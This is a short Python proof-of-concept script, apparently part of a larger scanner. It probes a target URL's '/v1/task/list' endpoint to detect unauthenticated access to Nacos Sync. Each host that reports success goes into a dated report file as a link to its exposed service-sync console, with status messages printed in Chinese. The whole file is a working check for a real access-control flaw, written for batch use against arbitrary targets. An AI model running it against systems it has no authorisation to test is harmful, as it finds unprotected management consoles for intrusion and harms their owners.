import requests
import time

import buter

filename = "./reps/nacos_sync_unauthorized-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
poc ='/v1/task/list?pageSize=10&pageNum=1'

def nasyun(url):
    try:
        rep = requests.get(url=url+poc,headers=headers,verify=False,timeout=3)
        if rep.status_code == 200 and '"success":true' in rep.text:
            print(buter.colors.GREEN + f"存在nacos_sync_unauthorized url : {url}/#/serviceSync " + buter.colors.END)
            f = open(filename,"a+",encoding="utf-8")
            f.write(f"{url}/#/serviceSync")
            f.write("\n")
            f.close()
        else:
            print(buter.colors.RED + f"未发现nacos_sync_unauthorized url : {url}" + buter.colors.END)
    except Exception as e:
        print(buter.colors.END + f"ERROR : {e}"+ buter.colors.END)
